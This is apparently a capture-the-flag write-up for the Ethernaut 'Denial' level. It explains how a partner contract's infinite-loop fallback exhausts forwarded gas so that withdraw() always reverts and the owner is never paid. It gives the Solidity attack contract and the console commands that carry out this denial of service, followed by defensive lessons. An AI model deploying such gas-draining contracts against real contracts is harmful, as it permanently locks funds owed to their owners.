# Level 20: Denial

## Challenge Overview

This level shows how a malicious fallback can block a contract’s logic by draining all provided gas.  
In the `Denial` contract, calling `withdraw()` sends 1% of its balance to a “partner” via `partner.call{gas: 1e6, value: …}("")`.  
If that partner’s fallback uses up all 1 000 000 gas, `partner.call` returns `false` and `withdraw()` reverts before paying the owner.



## Solution

### 1. Deploy a Malicious Partner Contract

Create a contract whose fallback gets stuck in an infinite loop, consuming all gas in its stipend:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DenialAttack {
    fallback() external payable {
        while (true) { }
    }
}
```

> This fallback will use up the entire 1 000 000 gas supplied by Denial’s `partner.call`.



### 2. Set Your Contract as the Partner

In the Ethernaut console (with `denial` pointing to the `Denial` instance and `denialAttack` your deployed address), run:

```js
await denial.setWithdrawPartner(denialAttack.address);
```

> Now, whenever `withdraw()` tries to send 1% to `partner`, it calls your `DenialAttack` fallback.



### 3. Trigger the DoS and Verify

Call `withdraw()`:

```js
try {
  await denial.withdraw();
} catch (err) {
  console.log("withdraw() failed due to gas exhaustion");
}
```



When `Denial` executes:

```solidity
(sentToPartner, ) = partner.call{gas: 1e6, value: amountToSend}("");
require(sentToPartner);
```

- The fallback’s infinite loop drains the 1 000 000 gas, so `sentToPartner` is `false`  
- `withdraw()` reverts. The owner never receives the remaining 99%.
- Any future `withdraw()` will behave the same way — owner can never be paid.



## Lessons Learned

- Don’t let a fallback consume unbounded gas. An infinite loop or heavy computation blocks the caller’s execution.
- Be careful when using `call{gas: …}` on untrusted addresses—if that gas is used up, your function can revert.
- Instead of `require(partner.call(...))`, consider handling a failed partner transfer (e.g., send remainder to owner or revert early).
- Use `.transfer()` or low-gas-limit calls only when you trust the recipient, and always apply checks-effects-interactions to avoid DoS.
